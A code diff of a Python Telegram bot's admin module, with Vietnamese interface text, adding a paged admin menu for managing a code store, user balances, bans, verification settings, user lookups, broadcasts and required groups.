+        status_text = "🟢 BẬT" if new_val else "🔴 TẮT"
+        try:
+            await query.answer(
+                f"Captcha & Camera MiniApp: {status_text}"
+            )
+        except Exception:
+            pass
+        text, reply_markup = await build_admin_menu()
+        try:
+            await query.edit_message_text(
+                text, reply_markup=reply_markup, parse_mode="HTML"
+            )
+        except Exception:
+            pass
+        return
+
+    key_map = {
+        "toggle_verify_phone": "verify_phone",
+        "toggle_verify_cccam": "verify_cccam",
+        "toggle_verify_ip": "verify_ip",
+        "toggle_verify_channel": "verify_channel",
+        "toggle_verify_captcha": "verify_captcha",
+        "toggle_allow_withdraw": "allow_withdraw",
+        "toggle_auto_buy_code": "auto_buy_code",
+        "toggle_verify_camera": "verify_camera",
+    }
+    if data in key_map:
+        setting_key = key_map[data]
+        curr_val = await get_verify_setting(setting_key)
+        new_val = not curr_val
+        await set_verify_setting(setting_key, new_val)
+
+        if data == "toggle_verify_cccam" and new_val:
+            await reset_camera_verification()
+            status_text = (
+                "🟢 BẬT - toàn bộ thành viên phải xác minh lại Captcha & Camera"
+            )
+            try:
+                await query.answer(f"CCCAM: {status_text}", show_alert=True)
+            except Exception:
+                pass
+        else:
+            status_text = "🟢 BẬT" if new_val else "🔴 TẮT"
+            try:
+                await query.answer(
+                    f"Đã chuyển trạng thái sang {status_text}"
+                )
+            except Exception:
+                pass
+
+        text, reply_markup = await build_admin_menu()
+        try:
+            await query.edit_message_text(
+                text, reply_markup=reply_markup, parse_mode="HTML"
+            )
+        except Exception:
+            pass
+
+
+async def adm_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update):
+        return
+
+    keyboard = [
+        [
+            abtn(
+                "/broadcast (Gửi thông báo)",
+                "MONEY_FLY",
+                callback_data="adm_step_broadcast",
+            ),
+            abtn(
+                "/addstock (Thêm mã code)",
+                "PLUS",
+                callback_data="adm_step_addstock",
+            ),
+        ],
+        [
+            abtn(
+                "/addbal (Cộng tiền user)",
+                "MONEY",
+                callback_data="adm_step_addbal",
+            ),
+            abtn(
+                "/subbal (Trừ tiền user)",
+                "CARD",
+                callback_data="adm_step_subbal",
+            ),
+        ],
+        [
+            abtn(
+                "/info (Xem chi tiết user)",
+                "BULB",
+                callback_data="adm_step_info",
+            ),
+            abtn(
+                "/detail (Kiểm tra ID chi tiết)",
+                "SHIELD2",
+                callback_data="adm_step_detail",
+            ),
+        ],
+        [
+            abtn(
+                "/ban (Cấm vĩnh viễn)",
+                "CROSS",
+                callback_data="adm_step_ban",
+            ),
+            abtn(
+                "/unban (Gỡ cấm user)",
+                "UNLOCK",
+                callback_data="adm_step_unban",
+            ),
+        ],
+        [
+            abtn(
+                "/banwd (Cấm rút code)",
+                "ALERT",
+                callback_data="adm_step_banwd",
+            ),
+            abtn(
+                "/unbanwd (Gỡ cấm rút code)",
+                "TARGET",
+                callback_data="adm_step_unbanwd",
+            ),
+        ],
+        [
+            abtn(
+                "/stock (Thống kê kho code)",
+                "BATTERY",
+                callback_data="adm_act_stock",
+            ),
+            abtn(
+                "/liststock (Danh sách code)",
+                "INBOX",
+                callback_data="adm_act_liststock",
+            ),
+        ],
+        [
+            abtn(
+                "/users (Thống kê thành viên)",
+                "PC",
+                callback_data="adm_act_users",
+            ),
+            abtn(
+                "/maint (Bật/Tắt bảo trì)",
+                "PICK",
+                callback_data="adm_act_maint",
+            ),
+        ],
+        [abtn(
+            "/resetverify (Reset xác minh toàn bộ)",
+            "REFRESH",
+            callback_data="adm_act_resetverify",
+        )],
+    ]
+
+    msg = (
+        f"{E['SHIELD']} <b>BẢNG ĐIỀU KHIỂN LỆNH ADMIN VIP</b> {E['CROWN']}\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"<i>Bấm vào các nút bên dưới, sau đó bạn chỉ cần gửi trực tiếp nội dung/số liệu cần thao tác:</i>\n\n"
+        f"{E['RIGHT']} <b>/broadcast:</b> Gửi thông báo đến toàn bộ người dùng & nhóm.\n"
+        f"{E['RIGHT']} <b>/addstock:</b> Thêm mã code mới vào kho (tự lọc code trùng).\n"
+        f"{E['RIGHT']} <b>/addbal / subbal:</b> Cộng hoặc trừ số dư tài khoản user.\n"
+        f"{E['RIGHT']} <b>/info / detail:</b> Xem thông tin chi tiết user.\n"
+        f"{E['RIGHT']} <b>/ban / unban:</b> Quản lý trạng thái khóa tài khoản.\n"
+        f"{E['RIGHT']} <b>/banwd / unbanwd:</b> Quản lý trạng thái cấm rút code.\n\n"
+        f"{E['STAR']} <b>LỆNH MỚI:</b>\n"
+        f"{E['RIGHT']} <b>/biofriends ID:</b> Kiểm tra bạn bè được mời có tiểu sử @Lienminhvietnam.\n"
+        f"{E['RIGHT']} <b>/stats:</b> Bảng thống kê tổng quan hệ thống.\n"
+        f"{E['RIGHT']} <b>/find từ_khóa:</b> Tìm user theo ID / @username / SĐT / IP.\n"
+        f"{E['RIGHT']} <b>/lookup IP|SĐT|@name|ID:</b> Tra cứu full thông tin + ảnh camera.\n"
+        f"{E['RIGHT']} <b>/banlist, /wdbanlist:</b> Danh sách bị khóa / bị cấm rút code.\n"
+        f"{E['RIGHT']} <b>/topbal:</b> Top số dư cao nhất.\n"
+        f"{E['RIGHT']} <b>/dupip, /dupphone:</b> IP / SĐT dùng chung nhiều tài khoản.\n"
+        f"{E['RIGHT']} <b>/sendmsg ID nội_dung:</b> Nhắn riêng cho 1 user.\n"
+        f"{E['RIGHT']} <b>/addgroup, /delgroup, /listgroup, /checkgroup:</b> Quản lý nhóm yêu cầu tham gia.\n"
+        f"{E['RIGHT']} <b>/price, /setprice, /upprice, /downprice:</b> Xem / đổi giá code."
+    )
+    await update.message.reply_text(
+        msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML"
+    )
+
+
+async def adm_step_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    if not query or not is_admin(update):
+        return
+    data = query.data or ""
+    user_id = query.from_user.id
     try:
-        target_id = int(data.split("_")[2])
-    except (IndexError, ValueError):
+        await query.answer()
+    except Exception:
+        pass
+
+    if data.startswith("adm_act_"):
+        action = data.replace("adm_act_", "")
+        if action == "stock":
+            res1 = await db_query(
+                "SELECT COUNT(*) FROM code_stock WHERE is_used=0",
+                fetchone=True,
+            )
+            cnt = res1[0] if res1 else 0
+            await query.message.reply_text(
+                f"{E['FIRE']} <b>Thống kê kho code:</b> Tổng số code chưa sử dụng: <b>{cnt:,}</b>",
+                parse_mode="HTML",
+            )
+        elif action == "liststock":
+            codes_list = await db_query(
+                "SELECT id, code_val, created_at FROM code_stock WHERE is_used=0 ORDER BY id DESC LIMIT 20",
+                fetchall=True,
+            )
+            if not codes_list:
+                await query.message.reply_text(
+                    f"{E['BANDAGE']} Kho code đang trống!", parse_mode="HTML"
+                )
+                return
+            text_res = f"{E['TOP']} <b>20 Code mới nhất trong kho:</b>\n"
+            for cid, cval, cat in codes_list:
+                text_res += (
+                    f"• ID: <code>{cid}</code> | Code: <code>{cval}</code>\n"
+                )
+            await query.message.reply_text(text_res, parse_mode="HTML")
+        elif action == "users":
+            res = await db_query("SELECT COUNT(*) FROM users", fetchone=True)
+            await query.message.reply_text(
+                f"{E['RIGHT']} Tổng số thành viên trong hệ thống: <b>{res[0]:,}</b>",
+                parse_mode="HTML",
+            )
+        elif action == "maint":
+            curr = await is_maintenance()
+            new_val = "0" if curr else "1"
+            await db_query(
+                "UPDATE settings SET value=%s WHERE key='maintenance'",
+                (new_val,),
+                commit=True,
+            )
+            status_str = (
+                "BẮT ĐẦU BẢO TRÌ 🔴"
+                if new_val == "1"
+                else "TẮT BẢO TRÌ 🟢"
+            )
+            await query.message.reply_text(
+                f"{E['GEAR']} Trạng thái hệ thống đã đổi thành: <b>{status_str}</b>",
+                parse_mode="HTML",
+            )
+        elif action == "resetverify":
+            await db_query(
+                "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
+                commit=True,
+            )
+            pending_miniapp_captcha.clear()
+            pending_camera_verified.clear()
+            await query.message.reply_text(
+                f"{E['REFRESH']} Đã đặt lại trạng thái xác minh toàn bộ thành viên!",
+                parse_mode="HTML",
+            )
         return
 
-    txs = await db_query("SELECT type, amount, status, created_at FROM transactions WHERE user_id=%s ORDER BY id DESC LIMIT 20", (target_id,), fetchall=True)
-    if not txs:
-        await context.bot.send_message(chat_id=query.from_user.id, text=f"{E['CALENDAR']} <b>Người dùng <code>{target_id}</code> chưa có lịch sử giao dịch nào.</b>", parse_mode="HTML")
+    step_map = {
+        "adm_step_broadcast": (
+            "broadcast",
+            f"{E['MONEY_FLY']} <b>Nhập nội dung thông báo bạn muốn gửi:</b>\n<i>(Chỉ cần gửi nội dung, không cần gõ /broadcast)</i>",
+        ),
+        "adm_step_addstock": (
+            "addstock",
+            f"{E['PLUS']} <b>Nhập danh sách mã code cần thêm:</b>\n<i>(Có thể nhập nhiều mã cách nhau bằng khoảng trắng hoặc xuống dòng. Code trùng sẽ tự động bị lọc)</i>",
+        ),
+        "adm_step_addbal": (
+            "addbal",
+            f"{E['CROWN']} <b>Nhập thông tin theo cú pháp:</b> <code>USER_ID SỐ_TIỀN</code>\n<i>Ví dụ: 5633649201 50000</i>",
+        ),
+        "adm_step_subbal": (
+            "subbal",
+            f"{E['WARN']} <b>Nhập thông tin theo cú pháp:</b> <code>USER_ID SỐ_TIỀN</code>\n<i>Ví dụ: 5633649201 20000</i>",
+        ),
+        "adm_step_info": (
+            "info",
+            f"{E['CLIP']} <b>Nhập USER_ID cần xem thông tin cơ bản:</b>",
+        ),
+        "adm_step_detail": (
+            "detail",
+            f"{E['SHIELD']} <b>Nhập USER_ID cần kiểm tra chi tiết đầy đủ:</b>",
+        ),
+        "adm_step_ban": (
+            "ban",
+            f"{E['CROSS']} <b>Nhập USER_ID cần cấm vĩnh viễn:</b>",
+        ),
+        "adm_step_unban": (
+            "unban",
+            f"{E['CHECK']} <b>Nhập USER_ID cần gỡ cấm:</b>",
+        ),
+        "adm_step_banwd": (
+            "banwd",
+            f"{E['WARN']} <b>Nhập USER_ID cần cấm rút code:</b>",
+        ),
+        "adm_step_unbanwd": (
+            "unbanwd",
+            f"{E['RIGHT']} <b>Nhập USER_ID cần gỡ cấm rút code:</b>",
+        ),
+    }
+
+    if data in step_map:
+        cmd_type, prompt_text = step_map[data]
+        admin_input_states[user_id] = cmd_type
+        await query.message.reply_text(prompt_text, parse_mode="HTML")
+
+
+async def build_user_info_text(target_id: int):
+    u = await db_query(
+        "SELECT * FROM users WHERE user_id=%s", (target_id,), fetchone=True
+    )
+    if not u:
+        return None
+    invited_count = await get_valid_referrals_count(target_id)
+    username = f"@{u[1]}" if u[1] else "Chưa đặt"
+    referrer = u[4] if u[4] is not None else "Không có"
+    phone_val = u[8] if len(u) > 8 and u[8] else "Chưa xác minh"
+    ip_val = u[9] if len(u) > 9 and u[9] else "Chưa xác minh"
+    return (
+        f"{E['LOVE_FACE']} <b>THÔNG TIN CHI TIẾT USER</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"{E['RIGHT']} ID: <code>{u[0]}</code>\n"
+        f"{E['PHONE']} SĐT: <code>{phone_val}</code>\n"
+        f"{E['GLOBE']} IP: <code>{ip_val}</code>\n"
+        f"{E['CROWN2']} Username: {username}\n"
+        f"{E['MONEY']} Số dư: <code>{u[2]:,}đ</code>\n"
+        f"{E['RIGHT']} Khách giới thiệu: <code>{referrer}</code>\n"
+        f"{E['ROCKET']} Đã mời thành công: <code>{invited_count}</code> người\n"
+        f"{E['CROSS']} Khóa TK: <b>{'CÓ' if u[5] else 'KHÔNG'}</b>\n"
+        f"{E['WARN']} Cấm rút code: <b>{'CÓ' if u[6] else 'KHÔNG'}</b>\n"
+        f"{E['HOURGLASS']} Tham gia: <code>{u[7]}</code>"
+    )
+
+
+async def userinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    if not query or not is_admin(update):
         return
+    try:
+        await query.answer()
+    except Exception:
+        pass
+    try:
+        target_id = int((query.data or "").replace("userinfo_", ""))
+    except ValueError:
+        return
+    text = await build_user_info_text(target_id)
+    if not text:
+        await query.message.reply_text(
+            f"{E['CROSS']} Không tìm thấy user này.", parse_mode="HTML"
+        )
+        return
+    await query.message.reply_text(text, parse_mode="HTML")
 
-    msg = f"{E['CHART']} <b>TOÀN BỘ LỊCH SỬ GIAO DỊCH CỦA <code>{target_id}</code></b>\n━━━━━━━━━━━━━━━━━━\n\n"
-    for tx_type, amount, status, created_at in txs:
-        icon = E['THUMB'] if status == "Thành công" else (E['BAN'] if status == "Từ chối" else E['CALENDAR'])
-        msg += f"{icon} <b>{tx_type}</b>: <code>{amount:,}đ</code>\n{E['CHART']} Trạng thái: <b>{status}</b>\n{E['CALENDAR']} Thời gian: <code>{created_at}</code>\n----------------------------------\n"
 
-    await context.bot.send_message(chat_id=query.from_user.id, text=msg, parse_mode="HTML")
+ADMIN_PAGES = [
+    {
+        "icon": "CART",
+        "title": "KHO CODE",
+        "desc": (
+            "• <b>/addstock</b> – thêm code (tự lọc trùng)\n"
+            "• <b>/liststock</b> – 50 code mới nhất trong kho\n"
+            "• <b>/stock</b> – thống kê số code còn lại\n"
+            "• <b>/buyhistory</b> – 30 lượt mua code gần nhất\n"
+            "• <b>/delhistory</b> – lịch sử code đã xóa\n"
+            "• <b>/clearstock</b> – ⚠️ xóa TOÀN BỘ kho code"
+        ),
+        "items": [
+            ("/addstock", "i", "addstock", "PLUS"),
+            ("/liststock", "r", "liststock", "INBOX"),
+            ("/stock", "r", "stock", "BATTERY"),
+            ("/buyhistory", "r", "buyhistory", "CART"),
+            ("/delhistory", "r", "delhistory", "TRASH"),
+            ("/clearstock", "c", "clearstock", "ALERT"),
+        ],
+    },
+    {
+        "icon": "MONEY",
+        "title": "SỐ DƯ & GIAO DỊCH",
+        "desc": (
+            "• <b>/addbal</b> – cộng tiền user\n"
+            "• <b>/subbal</b> – trừ tiền user\n"
+            "• <b>/topbal</b> – top 15 số dư cao nhất\n"
+            "• <b>/txlog</b> – 20 giao dịch gần nhất của user\n"
+            "• <b>/txfull</b> – toàn bộ lịch sử giao dịch của user\n"
+            "• <b>/zerobal</b> – ⚠️ đưa số dư MỌI user về 0"
+        ),
+        "items": [
+            ("/addbal", "i", "addbal", "MONEY_FLY"),
+            ("/subbal", "i", "subbal", "MONEY2"),
+            ("/topbal", "r", "topbal", "TOP"),
+            ("/txlog", "i", "txlog", "CARD"),
+            ("/txfull", "i", "txfull", "SCALE"),
+            ("/zerobal", "c", "zerobal", "ALERT"),
+        ],
+    },
+    {
+        "icon": "UNLOCK",
+        "title": "KHÓA / MỞ KHÓA",
+        "desc": (
+            "• <b>/ban</b> – khóa vĩnh viễn  |  <b>/unban</b> – gỡ khóa\n"
+            "• <b>/banwd</b> – cấm rút code  |  <b>/unbanwd</b> – gỡ cấm rút\n"
+            "• <b>/unall</b> – mở TẤT CẢ hạn chế (khóa, cấm rút, captcha, captcha MiniApp, IP)\n"
+            "• <b>/uncap</b> – mở khóa + bỏ qua captcha (cả captcha MiniApp)\n"
+            "• <b>/skipip</b> – bỏ qua kiểm tra IP\n"
+            "• <b>/unip</b> – mở khóa trùng IP\n"
+            "• <b>/banlist</b> – DS bị khóa  |  <b>/wdbanlist</b> – DS bị cấm rút"
+        ),
+        "items": [
+            ("/ban", "i", "ban", "CROSS"),
+            ("/unban", "i", "unban", "UNLOCK"),
+            ("/banwd", "i", "banwd", "SHIELD"),
+            ("/unbanwd", "i", "unbanwd", "TARGET"),
+            ("/unall", "i", "unall", "LOVE1"),
+            ("/uncap", "i", "uncap", "DICE"),
+            ("/skipip", "i", "skipip", "LINK"),
+            ("/unip", "i", "unip", "REFRESH"),
+            ("/banlist", "r", "banlist", "PIN2"),
+            ("/wdbanlist", "r", "wdbanlist", "PIN"),
+        ],
+    },
+    {
+        "icon": "BULB",
+        "title": "TRA CỨU USER",
+        "desc": (
+            "• <b>/info</b> – thông tin cơ bản user\n"
+            "• <b>/detail</b> – thông tin chi tiết + người giới thiệu\n"
+            "• <b>/lookup</b> – tra cứu IP / SĐT / @name + gửi ảnh camera\n"
+            "• <b>/find</b> – tìm theo ID / @username / SĐT / IP\n"
+            "• <b>/friends</b> – danh sách bạn bè do user mời\n"
+            "• <b>/users</b> – tổng thành viên + nút xem nhanh\n"
+            "• <b>/dupip</b>, <b>/dupphone</b> – IP / SĐT dùng chung nhiều tài khoản"
+        ),
+        "items": [
+            ("/info", "i", "info", "BULB"),
+            ("/detail", "i", "detail", "SHIELD2"),
+            ("/lookup", "i", "lookup", "IMAGE"),
+            ("/find", "i", "find", "TARGET"),
+            ("/friends", "i", "friends", "NEXT"),
+            ("/users", "r", "users", "PC"),
+            ("/dupip", "r", "dupip", "LINK"),
+            ("/dupphone", "r", "dupphone", "PHONE"),
+        ],
+    },
+    {
+        "icon": "SHIELD",
+        "title": "BUFF REF & HỆ THỐNG",
+        "desc": (
+            "• <b>/biofriends</b> – check bio bạn bè của 1 user\n"
+            "• <b>/checkref</b> – check bio người được giới thiệu\n"
+            "• <b>/scanbio</b>, <b>/banbuff</b> – quét & khóa toàn hệ thống\n"
+            "• <b>/broadcast</b> – thông báo toàn bộ  |  <b>/sendmsg</b> – nhắn 1 user\n"
+            "• <b>/stats</b> – thống kê tổng quan\n"
+            "• <b>/maint</b> – bật/tắt bảo trì\n"
+            "• <b>/resetverify</b> – ⚠️ reset xác minh toàn bộ\n"
+            "• <b>/wipeall</b> – ⚠️ XÓA SẠCH dữ liệu hệ thống\n"
+            "• <b>Cài đặt</b> – bật/tắt SĐT, CCCAM, Captcha MiniApp, IP, Camera, Kênh, Captcha, Rút tiền, Auto mua code"
+        ),
+        "items": [
+            ("/biofriends", "i", "biofriends", "SHIELD2"),
+            ("/checkref", "i", "checkref", "PIN2"),
+            ("/scanbio", "c", "scanbio", "PICK"),
+            ("/banbuff", "c", "banbuff", "ALERT"),
+            ("/broadcast", "i", "broadcast", "BOOM"),
+            ("/sendmsg", "i", "sendmsg", "MAIL"),
+            ("/stats", "r", "stats", "TOP2"),
+            ("/maint", "r", "maint", "PC"),
+            ("/resetverify", "c", "resetverify", "REFRESH"),
+            ("/wipeall", "c", "wipeall", "TRASH"),
+            ("Cài đặt bật/tắt", "s", "", "LAPTOP"),
+        ],
+    },
+    {
+        "icon": "TOP",
+        "title": "NHÓM YÊU CẦU & GIÁ CODE",
+        "desc": (
+            "• <b>/addgroup</b> – thêm nhóm/kênh bắt buộc (bot phải là admin)\n"
+            "• <b>/delgroup</b> – xóa nhóm (nhập ID số trong danh sách hoặc @username)\n"
+            "• <b>/listgroup</b> – danh sách nhóm đang yêu cầu\n"
+            "• <b>/checkgroup</b> – kiểm tra bot có là admin ở TẤT CẢ nhóm không\n"
+            "• <b>/checkadmin</b> – kiểm tra bot có là admin ở 1 nhóm cụ thể không\n"
+            "• <b>/clearallgroup</b> – ⚠️ xóa TẤT CẢ nhóm yêu cầu tham gia\n"
+            "• <b>/price</b> – xem giá code hiện tại\n"
+            "• <b>/setprice</b> – đặt giá mới  |  <b>/upprice</b> – tăng giá  |  <b>/downprice</b> – giảm giá"
+        ),
+        "items": [
+            ("/addgroup", "i", "addgroup", "PLUS"),
+            ("/delgroup", "i", "delgroup", "TRASH"),
+            ("/listgroup", "r", "listgroup", "PIN2"),
+            ("/checkgroup", "r", "checkgroup", "SHIELD2"),
+            ("/checkadmin", "i", "checkadmin", "TARGET"),
+            ("/clearallgroup", "c", "clearallgroup", "ALERT"),
+            ("/price", "r", "price", "CARD"),
+            ("/setprice", "i", "setprice", "MONEY"),
+            ("/upprice", "i", "upprice", "UPRIGHT"),
+            ("/downprice", "i", "downprice", "NEXT"),
+        ],
+    },
+]
 
-# ============================================================
-# ADMIN COMMANDS
-# ============================================================
+ADMIN_INPUT_PROMPTS = {
+    "addstock": "Nhập danh sách code (cách nhau bằng khoảng trắng hoặc xuống dòng):",
+    "addbal": "Nhập: <code>USER_ID SỐ_TIỀN</code>\n<i>Ví dụ: 5633649201 50000</i>",
+    "subbal": "Nhập: <code>USER_ID SỐ_TIỀN</code>\n<i>Ví dụ: 5633649201 20000</i>",
+    "txlog": "Nhập <b>USER_ID</b> cần xem 20 giao dịch gần nhất:",
+    "txfull": "Nhập <b>USER_ID</b> cần xem toàn bộ lịch sử giao dịch:",
+    "ban": "Nhập <b>USER_ID</b> cần khóa vĩnh viễn:",
+    "unban": "Nhập <b>USER_ID</b> cần gỡ khóa:",
+    "banwd": "Nhập <b>USER_ID</b> cần cấm rút code:",
+    "unbanwd": "Nhập <b>USER_ID</b> cần gỡ cấm rút code:",
+    "unall": "Nhập <b>USER_ID</b> cần mở tất cả hạn chế:",
+    "uncap": "Nhập <b>USER_ID</b> cần mở khóa captcha/tài khoản:",
+    "skipip": "Nhập <b>USER_ID</b> cần bỏ qua kiểm tra IP:",
+    "unip": "Nhập <b>USER_ID</b> cần mở khóa trùng IP:",
+    "info": "Nhập <b>USER_ID</b> cần xem thông tin cơ bản:",
+    "detail": "Nhập <b>USER_ID</b> cần xem thông tin chi tiết:",
+    "find": "Nhập từ khóa: <b>ID / @username / SĐT / IP</b>",
+    "lookup": "Nhập <b>IP / SĐT / @username / USER_ID</b> để tra cứu + xem ảnh camera:",
+    "friends": "Nhập <b>USER_ID</b> cần xem danh sách bạn bè đã mời:",
+    "biofriends": "Nhập <b>USER_ID</b> người mời cần check bio bạn bè:",
+    "checkref": "Nhập <b>USER_ID hoặc @username</b> người giới thiệu:",
+    "broadcast": "Nhập nội dung thông báo gửi toàn bộ người dùng & nhóm:",
+    "sendmsg": "Nhập: <code>USER_ID Nội dung tin nhắn</code>",
+    "addgroup": "Nhập: <code>@username</code> hoặc link <code>t.me/...</code>\n<i>Nhóm riêng tư:</i> <code>-100123... https://t.me/+linkmoi</code>\n⚠️ Bot phải là <b>admin</b> của nhóm trước.",
+    "delgroup": "Nhập <b>ID số</b> (trong /listgroup) hoặc <b>@username</b> nhóm cần xóa:",
+    "checkadmin": "Nhập <b>@username / link / ID</b> nhóm cần kiểm tra bot đã là admin chưa:",
+    "setprice": "Nhập giá code mới (VD: <code>3000</code>):",
+    "upprice": "Nhập số tiền muốn <b>TĂNG</b> giá (VD: <code>500</code>):",
+    "downprice": "Nhập số tiền muốn <b>GIẢM</b> giá (VD: <code>500</code>):",
+}
 
-def is_admin(update: Update):
-    return bool(update.effective_user and update.effective_user.id in ADMIN_IDS)
+ADMIN_CONFIRM_TEXT = {
+    "clearstock": "XÓA TOÀN BỘ KHO CODE",
+    "zerobal": "ĐƯA SỐ DƯ CỦA TẤT CẢ USER VỀ 0",
+    "scanbio": "QUÉT BIO TOÀN HỆ THỐNG VÀ KHÓA TÀI KHOẢN BUFF (mất khá nhiều thời gian)",
+    "banbuff": "QUÉT BIO TOÀN HỆ THỐNG VÀ KHÓA TÀI KHOẢN BUFF (mất khá nhiều thời gian)",
+    "resetverify": "RESET XÁC MINH CỦA TOÀN BỘ THÀNH VIÊN",
+    "wipeall": "XÓA SẠCH TOÀN BỘ NGƯỜI DÙNG, KHO CODE VÀ GIAO DỊCH",
+    "clearallgroup": "XÓA TẤT CẢ NHÓM/KÊNH YÊU CẦU THAM GIA (user sẽ không bị bắt tham gia nhóm nào nữa)",
+}
 
-async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
+_ADMIN_ALL_CMDS = {
+    cmd for pg in ADMIN_PAGES for _, _, cmd, _ in pg["items"] if cmd
+}
+
+ADMIN_TAB_NAMES = [
+    "Kho Code",
+    "Số Dư",
+    "Khóa/Mở",
+    "Tra Cứu",
+    "Hệ Thống",
+    "Nhóm & Giá",
+]
+ADMIN_NAV_TEXTS = {"Trang Trước", "Trang Sau", "Đóng Menu"}
+admin_menu_page = {}
+
+ADMIN_KB_ACTIONS = {
+    label.lstrip("/"): (mode, cmd)
+    for pg in ADMIN_PAGES
+    for label, mode, cmd, _ in pg["items"]
+}
+
+
+def _akb(text: str, key: str) -> KeyboardButton:
+    return KeyboardButton(
+        text, api_kwargs={"icon_custom_emoji_id": AI[key][0]}
+    )
+
+
+def get_admin_keyboard(page: int) -> ReplyKeyboardMarkup:
+    last = len(ADMIN_PAGES) - 1
+    tabs = [
+        _akb(("• " if i == page else "") + ADMIN_TAB_NAMES[i], p["icon"])
+        for i, p in enumerate(ADMIN_PAGES)
+    ]
+    rows = [tabs[:3], tabs[3:]]
+    row = []
+    for label, mode, cmd, icon in ADMIN_PAGES[page]["items"]:
+        row.append(_akb(label.lstrip("/"), icon))
+        if len(row) == 2:
+            rows.append(row)
+            row = []
+    if row:
+        rows.append(row)
+    nav = []
+    if page > 0:
+        nav.append(_akb("Trang Trước", "PIN2"))
+    if page < last:
+        nav.append(_akb("Trang Sau", "NEXT"))
+    if nav:
+        rows.append(nav)
+    rows.append([_akb("Đóng Menu", "CROSS")])
+    return ReplyKeyboardMarkup(rows, resize_keyboard=True)
+
+
+def build_admin_page_text(page: int) -> str:
+    pg = ADMIN_PAGES[page]
+    return (
+        f"{E['GEAR']} <b>MENU QUẢN TRỊ — {ai(pg['icon'])} {pg['title']}</b>\n"
+        f"Trang <b>{page + 1}/{len(ADMIN_PAGES)}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"{pg['desc']}\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"<i>Bấm nút ở bàn phím bên dưới để thao tác. Lệnh cần dữ liệu sẽ hỏi bạn nhập.</i>"
+    )
+
+
+def is_admin_kb_text(txt: str) -> bool:
+    raw = txt[2:] if txt.startswith("• ") else txt
+    return (
+        raw in ADMIN_TAB_NAMES
+        or raw in ADMIN_NAV_TEXTS
+        or raw in ADMIN_KB_ACTIONS
+    )
+
+
+async def show_admin_page(message, uid: int, page: int):
+    page = max(0, min(page, len(ADMIN_PAGES) - 1))
+    admin_menu_page[uid] = page
+    admin_input_states.pop(uid, None)
+    await message.reply_text(
+        build_admin_page_text(page),
+        reply_markup=get_admin_keyboard(page),
+        parse_mode="HTML",
+    )
+
+
+async def admin_keyboard_handler(
+    update: Update, context: ContextTypes.DEFAULT_TYPE, text: str
+) -> bool:
+    user = update.effective_user
+    message = update.effective_message
+    if not user or user.id not in ADMIN_IDS or not message:
+        return False
+    uid = user.id
+    raw = text[2:] if text.startswith("• ") else text
+    cur = admin_menu_page.get(uid, 0)
+
+    if raw in ADMIN_TAB_NAMES:
+        await show_admin_page(message, uid, ADMIN_TAB_NAMES.index(raw))
+        return True
+    if raw == "Trang Sau":
+        await show_admin_page(message, uid, cur + 1)
+        return True
+    if raw == "Trang Trước":
+        await show_admin_page(message, uid, cur - 1)
+        return True
+    if raw == "Đóng Menu":
+        admin_input_states.pop(uid, None)
+        admin_menu_page.pop(uid, None)
+        await message.reply_text(
+            f"{E['CHECK2']} Đã đóng menu quản trị.",
+            reply_markup=get_main_keyboard(uid),
+            parse_mode="HTML",
+        )
+        return True
+
+    if raw in ADMIN_KB_ACTIONS:
+        mode, cmd = ADMIN_KB_ACTIONS[raw]
+        if mode == "s":
+            admin_input_states.pop(uid, None)
+            t, markup = await build_admin_menu()
+            await message.reply_text(
+                t, reply_markup=markup, parse_mode="HTML"
+            )
+        elif mode == "i":
+            admin_input_states[uid] = cmd
+            prompt = ADMIN_INPUT_PROMPTS.get(cmd, "Nhập dữ liệu:")
+            await message.reply_text(
+                f"{E['RIGHT']} <b>/{cmd}</b>\n{prompt}", parse_mode="HTML"
+            )
+        elif mode == "r":
+            admin_input_states.pop(uid, None)
+            await admin_commands(update, context, override_cmd=f"/{cmd}")
+        elif mode == "c":
+            admin_input_states.pop(uid, None)
+            warn = ADMIN_CONFIRM_TEXT.get(cmd, "THỰC HIỆN LỆNH NÀY")
+            markup = InlineKeyboardMarkup([[
+                abtn("Xác nhận", "MEDAL", callback_data=f"amy_{cmd}"),
+                abtn("Hủy", "CROSS", callback_data="amcancel"),
+            ]])
+            await message.reply_text(
+                f"{E['WARN']} <b>XÁC NHẬN LỆNH /{cmd}</b>\n━━━━━━━━━━━━━━━━━━\n"
+                f"Bạn sắp: <b>{warn}</b>\nThao tác này không thể hoàn tác!",
+                reply_markup=markup,
+                parse_mode="HTML",
+            )
+        return True
+    return False
+
+
+async def admin_confirm_callback(
+    update: Update, context: ContextTypes.DEFAULT_TYPE
+):
+    query = update.callback_query
+    if not query:
+        return
+    if not is_admin(update):
+        await query.answer(
+            "Bạn không có quyền thực hiện thao tác này!", show_alert=True
+        )
+        return
+    try:
+        await query.answer()
+    except Exception:
+        pass
+    data = query.data or ""
+    if data == "amcancel":
+        try:
+            await query.edit_message_text(
+                f"{E['CROSS']} Đã hủy thao tác.", parse_mode="HTML"
+            )
+        except Exception:
+            pass
+        return
+    if data.startswith("amy_"):
+        cmd = data[4:]
+        if cmd not in _ADMIN_ALL_CMDS:
+            return
+        try:
+            await query.edit_message_text(
+                f"{E['HOURGLASS']} Đang thực hiện /{cmd}...", parse_mode="HTML"
+            )
+        except Exception:
+            pass
+        await admin_commands(update, context, override_cmd=f"/{cmd}")
+
+
+async def admin_commands(
+    update: Update, context: ContextTypes.DEFAULT_TYPE, override_cmd: str = None
+):
     if not is_admin(update):
         return
     message = update.effective_message
     if not message:
         return
-    cmd = (message.text or "").split()[0].split("@")[0].lower()
-    args = context.args or []
+    user_id = update.effective_user.id
+    chat_id = message.chat_id
+
+    args = list(context.args or [])
+    raw_text = message.text or ""
+    cmd = (raw_text.split()[0].split("@")[0].lower()) if raw_text.strip() else ""
+
+    if override_cmd:
+        cmd = override_cmd
+        args = []
+        raw_text = override_cmd
+
+    elif user_id in admin_input_states:
